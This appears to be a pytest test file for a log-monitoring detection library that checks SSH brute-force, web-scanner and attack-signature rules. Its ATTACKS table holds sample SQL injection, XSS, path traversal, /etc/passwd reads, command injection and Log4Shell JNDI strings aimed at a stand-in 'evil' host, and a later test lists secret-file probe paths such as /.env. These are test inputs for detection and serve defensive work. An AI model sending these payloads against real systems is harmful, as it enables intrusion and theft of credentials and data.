from logsentinel.rules import (ScannerUserAgent, SensitivePathProbe, SshBruteForce, SshSuccessAfterFailures,
                               SshUserEnumeration, WebAttackPatterns, WebLoginBruteForce, WebScanner, normalize_url)


def feed_all(rule, events):
    out = []
    for e in events:
        out += rule.feed(e)
    return out


# ---- SSH

def test_ssh_bruteforce_fires_at_threshold(make_ssh):
    rule = SshBruteForce(threshold=5, window_seconds=60)
    alerts = feed_all(rule, [make_ssh(i * 5, "ssh_fail") for i in range(5)])
    assert len(alerts) == 1
    assert alerts[0].count == 5


def test_ssh_bruteforce_slow_attempts_do_not_fire(make_ssh):
    rule = SshBruteForce(threshold=5, window_seconds=60)
    assert feed_all(rule, [make_ssh(i * 30, "ssh_fail") for i in range(10)]) == []


def test_ssh_bruteforce_is_per_ip(make_ssh):
    rule = SshBruteForce(threshold=3, window_seconds=60)
    events = [make_ssh(i, "ssh_fail", ip=f"203.0.113.{i}") for i in range(10)]
    assert feed_all(rule, events) == []


def test_ssh_bruteforce_ignores_other_kinds(make_ssh):
    rule = SshBruteForce(threshold=2, window_seconds=60)
    assert feed_all(rule, [make_ssh(i, "ssh_invalid_user") for i in range(5)]) == []


def test_user_enumeration_counts_distinct_users(make_ssh):
    rule = SshUserEnumeration(distinct_users=4, window_seconds=300)
    same = [make_ssh(i, "ssh_fail", user="root") for i in range(10)]
    assert feed_all(rule, same) == []
    rule = SshUserEnumeration(distinct_users=4, window_seconds=300)
    many = [make_ssh(i, "ssh_invalid_user", user=f"u{i}") for i in range(4)]
    assert len(feed_all(rule, many)) == 1


def test_success_after_failures_is_critical(make_ssh):
    rule = SshSuccessAfterFailures(min_failures=3, window_seconds=600)
    events = [make_ssh(i, "ssh_fail", user="deploy") for i in range(3)] + [make_ssh(10, "ssh_success", user="deploy")]
    alerts = feed_all(rule, events)
    assert len(alerts) == 1
    assert alerts[0].severity.name == "CRITICAL"


def test_success_without_failures_is_fine(make_ssh):
    rule = SshSuccessAfterFailures(min_failures=3, window_seconds=600)
    assert feed_all(rule, [make_ssh(0, "ssh_success")]) == []


def test_success_long_after_failures_is_fine(make_ssh):
    rule = SshSuccessAfterFailures(min_failures=3, window_seconds=600)
    events = [make_ssh(i, "ssh_fail") for i in range(3)] + [make_ssh(5000, "ssh_success")]
    assert feed_all(rule, events) == []


# ---- HTTP

def test_login_bruteforce_counts_only_failed_posts(make_http):
    rule = WebLoginBruteForce(threshold=3, window_seconds=300)
    ok_logins = [make_http(i, method="POST", path="/login", status=303) for i in range(10)]
    assert feed_all(rule, ok_logins) == []
    get_pages = [make_http(i, method="GET", path="/login", status=200) for i in range(10)]
    assert feed_all(rule, get_pages) == []
    bad = [make_http(i, method="POST", path="/login", status=200) for i in range(3)]
    assert len(feed_all(rule, bad)) == 1


def test_login_bruteforce_reports_throttled_requests(make_http):
    rule = WebLoginBruteForce(threshold=3, window_seconds=300)
    events = [make_http(i, method="POST", path="/login", status=200 if i < 2 else 429) for i in range(4)]
    alerts = feed_all(rule, events)
    assert alerts[-1].details["throttled_by_app"] == 2


def test_login_path_with_query_string_still_matches(make_http):
    rule = WebLoginBruteForce(threshold=1, window_seconds=300)
    assert len(feed_all(rule, [make_http(0, method="POST", path="/login?next=/", status=200)])) == 1


def test_scanner_needs_distinct_paths(make_http):
    rule = WebScanner(distinct_paths=5, window_seconds=60)
    same_path = [make_http(i, path="/missing", status=404) for i in range(20)]
    assert feed_all(rule, same_path) == []
    rule = WebScanner(distinct_paths=5, window_seconds=60)
    many = [make_http(i, path=f"/p{i}", status=404) for i in range(5)]
    assert len(feed_all(rule, many)) == 1


def test_scanner_ignores_successful_requests(make_http):
    rule = WebScanner(distinct_paths=3, window_seconds=60)
    assert feed_all(rule, [make_http(i, path=f"/p{i}", status=200) for i in range(10)]) == []


ATTACKS = {
    "sqli-union": "/items?id=1%20UNION%20SELECT%20null,password%20FROM%20users",
    "sqli-boolean": "/items?id=1%27%20OR%20%271%27%3D%271",
    "sqli-time": "/items?id=1;SELECT%20pg_sleep(5)",
    "sqli-schema": "/items?q=information_schema.tables",
    "xss": "/search?q=%3Cscript%3Ealert(1)%3C/script%3E",
    "path-traversal": "/static/../../secret",
    "sensitive-file": "/download?f=/etc/passwd",
    "cmd-injection": "/ping?host=8.8.8.8;cat%20/etc/hosts",
    "log4shell": "/?x=${jndi:ldap://evil/a}",
}


def test_attack_signatures_detect_known_payloads(make_http):
    rule = WebAttackPatterns()
    for name, path in ATTACKS.items():
        alerts = rule.feed(make_http(0, path=path))
        assert alerts, f"{name} не обнаружен: {path}"
        assert name in alerts[0].details["signatures"], (name, alerts[0].details["signatures"])


def test_double_encoded_traversal_is_detected(make_http):
    assert WebAttackPatterns().feed(make_http(0, path="/static/%252e%252e%252fsecret"))


def test_normal_requests_are_not_attacks(make_http):
    rule = WebAttackPatterns()
    for path in ["/", "/login", "/api/invoices?page=2&sort=date", "/api/suppliers?name=Ivanov+and+Sons",
                 "/static/app.js", "/analytics?from=2026-01-01", "/reports/export.csv"]:
        assert rule.feed(make_http(0, path=path)) == [], path


def test_log4shell_in_user_agent(make_http):
    assert WebAttackPatterns().feed(make_http(0, ua="${jndi:ldap://x/a}"))


def test_scanner_user_agent(make_http):
    rule = ScannerUserAgent()
    assert rule.feed(make_http(0, ua="sqlmap/1.8.4#stable (https://sqlmap.org)"))[0].details["tool"] == "sqlmap"
    assert rule.feed(make_http(0, ua="Mozilla/5.0 (Windows NT 10.0) Chrome/130")) == []
    assert rule.feed(make_http(0, ua=None)) == []


def test_sensitive_paths(make_http):
    rule = SensitivePathProbe()
    for path in ["/.env", "/.git/config", "/wp-login.php", "/phpmyadmin/index.php", "/backup.sql", "/index.php.bak"]:
        assert rule.feed(make_http(0, path=path, status=404)), path
    for path in ["/", "/login", "/api/invoices", "/health"]:
        assert rule.feed(make_http(0, path=path)) == [], path


def test_normalize_url():
    assert normalize_url("/A%2520B") == "/a b"
